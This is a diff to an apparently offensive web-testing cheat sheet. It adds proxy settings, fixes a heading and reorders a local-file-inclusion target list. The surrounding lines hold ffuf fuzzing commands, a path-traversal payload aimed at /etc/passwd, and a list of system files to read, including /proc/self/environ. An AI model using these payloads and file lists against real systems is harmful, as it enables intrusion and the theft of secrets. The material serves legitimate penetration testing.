@@ -159,6 +159,13 @@ Ctrl+Shift+b    // base64 encoding
 Ctrl+Shift+u    // URL decoding
 ```
 
+### Set Proxy Environment Variables
+
+```c
+$ export HTTP_PROXY=http://localhost:8080
+$ export HTTPS_PROXY=https://localhost:8080
+```
+
 ### Filter for SSRF (AutoRepeater)
 
 ```c
@@ -298,7 +305,7 @@ $ ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u htt
 $ ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
 ```
 
-### Looging for LFI
+### Searching for LFI
 
 ```c
 $ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
@@ -2327,6 +2334,7 @@ Accept: ../../../../.././../../../../etc/passwd{%00{{
 /logs/security_log
 /opt/lampp/etc/httpd.conf
 /opt/xampp/etc/php.ini
+/proc/cmdline
 /proc/cpuinfo
 /proc/filesystems
 /proc/interrupts
@@ -2334,17 +2342,18 @@ Accept: ../../../../.././../../../../etc/passwd{%00{{
 /proc/meminfo
 /proc/modules
 /proc/mounts
-/proc/<PID>/cmdline
-/proc/<PID>/maps
-/proc/stat
-/proc/swaps
-/proc/version
-/proc/self/net/arp
-/proc/self/cwd/app.py
-/proc/sched_debug
 /proc/net/arp
 /proc/net/tcp
 /proc/net/udp
+/proc/<PID>/cmdline
+/proc/<PID>/maps
+/proc/sched_debug
+/proc/self/cwd/app.py
+/proc/self/environ
+/proc/self/net/arp
+/proc/stat
+/proc/swaps
+/proc/version
 /root/anaconda-ks.cfg
 /usr/etc/pure-ftpd.conf
 /usr/lib/php.ini
